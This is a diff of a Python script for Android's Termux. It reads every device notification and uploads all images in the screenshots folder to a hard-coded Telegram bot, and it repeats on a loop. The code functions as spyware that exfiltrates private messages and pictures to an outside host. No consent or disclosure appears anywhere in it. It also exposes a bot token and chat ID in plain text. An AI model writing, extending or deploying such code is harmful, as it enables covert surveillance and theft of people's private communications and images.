@@ -1,82 +1,78 @@
-import subprocess
-import json
+import os
 import time
 import requests
-import os
+import subprocess
+import datetime
 
-# Telegram bot details
+# Telegram Bot API settings
 TELEGRAM_API_URL = "https://api.telegram.org/bot7762660744:AAHCxlWJvkwnI9ACKDX_zim2G8FEQa1_Drk/sendMessage"
 CHAT_ID = "5928551879"
 
+# Directory where screenshots are saved
+SCREENSHOT_DIR = "/storage/emulated/0/Pictures/Screenshots/"
+
 def send_telegram_message(message):
-    params = {
+    """Send a message to the Telegram bot"""
+    data = {
         'chat_id': CHAT_ID,
-        'text': message
+        'text': message,
     }
-    response = requests.get(TELEGRAM_API_URL, params=params)
+    response = requests.post(TELEGRAM_API_URL, data=data)
     return response.json()
 
-def send_telegram_photo(photo_path, caption=""):
+def send_telegram_photo(photo_path):
+    """Send a photo to the Telegram bot"""
     with open(photo_path, 'rb') as photo:
-        params = {
-            'chat_id': CHAT_ID,
-            'caption': caption
-        }
-        files = {'photo': photo}
-        response = requests.post(f"https://api.telegram.org/bot7762660744:AAHCxlWJvkwnI9ACKDX_zim2G8FEQa1_Drk/sendPhoto", params=params, files=files)
+        files = {'document': photo}
+        data = {'chat_id': CHAT_ID}
+        response = requests.post(f"https://api.telegram.org/bot7762660744:AAHCxlWJvkwnI9ACKDX_zim2G8FEQa1_Drk/sendDocument", data=data, files=files)
         return response.json()
 
-def get_notifications():
-    try:
-        # Capture notifications using termux-notification-list
-        notifications_raw = subprocess.check_output("termux-notification-list", shell=True, stderr=subprocess.PIPE)
-        notifications = json.loads(notifications_raw.decode('utf-8'))
-        return notifications
-    except Exception as e:
-        print(f"Error fetching notifications: {e}")
-        return None
+def get_screenshots():
+    """Get all screenshot files from the screenshot directory"""
+    screenshots = []
+    for root, dirs, files in os.walk(SCREENSHOT_DIR):
+        for file in files:
+            if file.lower().endswith(('.png', '.jpg', '.jpeg')):
+                screenshots.append(os.path.join(root, file))
+    return screenshots
 
-def capture_screenshot():
+def capture_notifications():
+    """Capture notifications using termux-notification-list"""
     try:
-        # Capture screenshot using termux-screenshot
-        print("Capturing screenshot...")
-        screenshot_path = "/data/data/com.termux/files/home/screenshot.png"
-        subprocess.run("termux-screenshot -e", shell=True, stderr=subprocess.PIPE)
-        
-        # Check if the screenshot file exists
-        if os.path.exists(screenshot_path):
-            print(f"Screenshot saved to: {screenshot_path}")
-            return screenshot_path
-        else:
-            print(f"Screenshot not saved. Check permissions and try again.")
-            return None
-    except Exception as e:
-        print(f"Error capturing screenshot: {e}")
-        return None
+        result = subprocess.check_output(['termux-notification-list'], stderr=subprocess.STDOUT)
+        notifications = result.decode('utf-8').splitlines()
 
-def parse_notifications(notifications):
-    parsed_messages = []
-    for notification in notifications:
-        app = notification.get("packageName", "Unknown App")
-        title = notification.get("title", "No Title")
-        content = notification.get("content", "No Content")
-        when = notification.get("when", "Unknown Time")
-        parsed_messages.append(f"App: {app}\nTitle: {title}\nContent: {content}\nTime: {when}")
-    return "\n\n".join(parsed_messages)
+        message = "Notifications:\n\n"
+        for notification in notifications:
+            # Simplify the format to extract details like app name, title, and text
+            if "App:" in notification and "Title:" in notification and "Text:" in notification:
+                message += f"{notification}\n\n"
+
+        # Send notifications to Telegram if any exist
+        if message.strip() != "Notifications:\n\n":
+            send_telegram_message(message)
+            print("Notifications sent to Telegram.")
+
+    except subprocess.CalledProcessError as e:
+        print(f"Error capturing notifications: {e.output.decode()}")
 
 def main():
     while True:
-        notifications = get_notifications()
-        if notifications:
-            message = parse_notifications(notifications)
-            send_telegram_message(f"Notifications:\n\n{message}")
-            
-            # Capture screenshot and send it
-            screenshot_path = capture_screenshot()
-            if screenshot_path:
-                send_telegram_photo(screenshot_path, caption="Here is the screenshot!")
-            
-        time.sleep(10)  # Wait for 10 seconds before checking again
+        # Capture notifications every 5 minutes (300 seconds)
+        capture_notifications()
+
+        # Get all screenshots in the directory and send them once a day
+        screenshots = get_screenshots()
+        if screenshots:
+            for screenshot in screenshots:
+                # Send each screenshot to Telegram
+                send_telegram_photo(screenshot)
+                print(f"Sent screenshot: {screenshot}")
+
+        # Wait for the next day (24 hours)
+        print(f"Waiting until next day...")
+        time.sleep(86400)  # Sleep for 24 hours (86400 seconds)
 
 if __name__ == "__main__":
     main()
